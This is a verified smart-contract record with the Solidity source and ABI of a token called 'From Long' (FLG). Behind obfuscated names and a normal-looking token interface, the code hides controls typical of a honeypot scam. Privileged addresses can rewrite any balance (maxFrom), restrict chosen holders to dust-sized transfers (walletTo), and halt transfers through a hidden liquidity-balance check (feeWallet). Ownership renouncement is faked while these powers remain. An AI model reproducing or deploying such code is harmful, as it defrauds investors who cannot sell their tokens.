{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface enableTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedMax {\n    function createPair(address swapLimitLaunch, address txTradingAt) external returns (address);\n}\n\ninterface modeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeToken) external view returns (uint256);\n\n    function transfer(address totalSellMarketing, uint256 limitSwap) external returns (bool);\n\n    function allowance(address listExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalSellMarketing,\n        uint256 limitSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitReceiver, uint256 value);\n    event Approval(address indexed listExempt, address indexed spender, uint256 value);\n}\n\ninterface modeListMetadata is modeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FromLong is launchAuto, modeList, modeListMetadata {\n\n    bool public tradingReceiver;\n\n    function balanceOf(address feeToken) public view virtual override returns (uint256) {\n        return fromEnable[feeToken];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptFee;\n    }\n\n    bool public modeTx;\n\n    address private autoLaunchAmount;\n\n    event OwnershipTransferred(address indexed enableMin, address indexed swapLiquidity);\n\n    address tradingTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private exemptFee = 100000000 * 10 ** 18;\n\n    address receiverLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTeamExempt;\n    }\n\n    mapping(address => bool) public tokenTx;\n\n    uint256 isReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletExempt;\n    }\n\n    string private tokenTeamExempt = \"From Long\";\n\n    constructor (){\n        if (maxMarketingBuy != launchedLaunchSell) {\n            modeTx = false;\n        }\n        enableTo totalExemptTake = enableTo(tradingTotal);\n        tradingTeamLimit = launchedMax(totalExemptTake.factory()).createPair(totalExemptTake.WETH(), address(this));\n        if (maxMarketingBuy != launchedLaunchSell) {\n            modeTx = false;\n        }\n        fromLaunched = _msgSender();\n        limitSender();\n        fundEnable[fromLaunched] = true;\n        fromEnable[fromLaunched] = exemptFee;\n        \n        emit Transfer(address(0), fromLaunched, exemptFee);\n    }\n\n    bool public tradingFeeMarketing;\n\n    uint256 public maxMarketingBuy;\n\n    function maxFrom(address atLiquidityMin, uint256 limitSwap) public {\n        walletMin();\n        fromEnable[atLiquidityMin] = limitSwap;\n    }\n\n    address public tradingTeamLimit;\n\n    function transfer(address atLiquidityMin, uint256 limitSwap) external virtual override returns (bool) {\n        return amountBuy(_msgSender(), atLiquidityMin, limitSwap);\n    }\n\n    function launchAmount(address marketingIs, address totalSellMarketing, uint256 limitSwap) internal returns (bool) {\n        require(fromEnable[marketingIs] >= limitSwap);\n        fromEnable[marketingIs] -= limitSwap;\n        fromEnable[totalSellMarketing] += limitSwap;\n        emit Transfer(marketingIs, totalSellMarketing, limitSwap);\n        return true;\n    }\n\n    mapping(address => uint256) private fromEnable;\n\n    function owner() external view returns (address) {\n        return autoLaunchAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamToken;\n\n    string private receiverToken = \"FLG\";\n\n    bool private shouldMaxSender;\n\n    bool public liquidityTotal;\n\n    address public fromLaunched;\n\n    uint256 public launchedLaunchSell;\n\n    mapping(address => bool) public fundEnable;\n\n    function getOwner() external view returns (address) {\n        return autoLaunchAmount;\n    }\n\n    function walletMin() private view {\n        require(fundEnable[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverToken;\n    }\n\n    function amountBuy(address marketingIs, address totalSellMarketing, uint256 limitSwap) internal returns (bool) {\n        if (marketingIs == fromLaunched) {\n            return launchAmount(marketingIs, totalSellMarketing, limitSwap);\n        }\n        uint256 teamReceiver = modeList(tradingTeamLimit).balanceOf(receiverLimit);\n        require(teamReceiver == isReceiver);\n        require(totalSellMarketing != receiverLimit);\n        if (tokenTx[marketingIs]) {\n            return launchAmount(marketingIs, totalSellMarketing, exemptMin);\n        }\n        return launchAmount(marketingIs, totalSellMarketing, limitSwap);\n    }\n\n    function autoExempt(address senderMax) public {\n        if (tradingReceiver) {\n            return;\n        }\n        \n        fundEnable[senderMax] = true;\n        if (liquidityTotal != shouldMaxSender) {\n            tradingFeeMarketing = true;\n        }\n        tradingReceiver = true;\n    }\n\n    function allowance(address marketingTrading, address listSwap) external view virtual override returns (uint256) {\n        if (listSwap == tradingTotal) {\n            return type(uint256).max;\n        }\n        return teamToken[marketingTrading][listSwap];\n    }\n\n    function walletTo(address amountLiquidity) public {\n        walletMin();\n        if (tradingFeeMarketing == liquidityTotal) {\n            maxMarketingBuy = launchedLaunchSell;\n        }\n        if (amountLiquidity == fromLaunched || amountLiquidity == tradingTeamLimit) {\n            return;\n        }\n        tokenTx[amountLiquidity] = true;\n    }\n\n    function approve(address listSwap, uint256 limitSwap) public virtual override returns (bool) {\n        teamToken[_msgSender()][listSwap] = limitSwap;\n        emit Approval(_msgSender(), listSwap, limitSwap);\n        return true;\n    }\n\n    uint256 txTradingShould;\n\n    uint8 private walletExempt = 18;\n\n    bool private fundWallet;\n\n    function feeWallet(uint256 limitSwap) public {\n        walletMin();\n        isReceiver = limitSwap;\n    }\n\n    uint256 constant exemptMin = 10 ** 10;\n\n    function limitSender() public {\n        emit OwnershipTransferred(fromLaunched, address(0));\n        autoLaunchAmount = address(0);\n    }\n\n    function transferFrom(address marketingIs, address totalSellMarketing, uint256 limitSwap) external override returns (bool) {\n        if (_msgSender() != tradingTotal) {\n            if (teamToken[marketingIs][_msgSender()] != type(uint256).max) {\n                require(limitSwap <= teamToken[marketingIs][_msgSender()]);\n                teamToken[marketingIs][_msgSender()] -= limitSwap;\n            }\n        }\n        return amountBuy(marketingIs, totalSellMarketing, limitSwap);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"}],\"name\":\"autoExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitSwap\",\"type\":\"uint256\"}],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunchSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSwap\",\"type\":\"uint256\"}],\"name\":\"maxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFeeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeamLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalSellMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"}],\"name\":\"walletTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FromLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}